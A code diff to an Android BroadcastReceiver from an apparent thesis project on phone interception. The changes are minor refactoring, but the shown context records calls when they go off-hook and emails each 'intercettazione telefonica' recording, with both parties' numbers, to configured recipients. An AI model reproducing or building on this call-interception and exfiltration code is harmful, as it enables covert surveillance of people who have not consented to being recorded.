@@ -48,16 +48,12 @@ public class OutgoingCallReceiver extends BroadcastReceiver {
 
         @Override
         protected String doInBackground(String... strings) {
-            String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
-
-            if(phoneNumber!=null)
-                savedPhoneNumber = phoneNumber;
+            if(intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER)!=null)
+                savedPhoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
 
             String action = intent.getAction();
             String uri = intent.toUri(Intent.URI_INTENT_SCHEME);
-            if(action.equals("android.intent.action.NEW_OUTGOING_CALL")){
-                Log.d(LOG_TAG, "Nuova chiamata verso "+ savedPhoneNumber);
-            }
+
             if(action.equals("android.intent.action.PHONE_STATE")){
                 if(uri.contains("state=OFFHOOK")){
                     Date currentTime = Calendar.getInstance().getTime();
@@ -71,7 +67,6 @@ public class OutgoingCallReceiver extends BroadcastReceiver {
                         try {
                             gms.sendMail("Invio intercettazione telefonica " + fileName,
                                     "In riferimento alla tesi magistrale sostenuta da Santoro Vincenzo con il Prof. De prisco, si invia ai fini di studio l'intercettazione telefonica tra " + myNumber + " e " + savedPhoneNumber,
-                                    ct.getResources().getString(R.string.user),
                                     ct.getResources().getString(R.string.recipients),
                                     cr.getLocation() + fileName);
                         } catch (Exception e) {
@@ -96,7 +91,6 @@ public class OutgoingCallReceiver extends BroadcastReceiver {
         @Override
         protected void onPostExecute(String s) {
             super.onPostExecute(s);
-            // Must call finish() so the BroadcastReceiver can be recycled.
             pendingResult.finish();
         }
     }
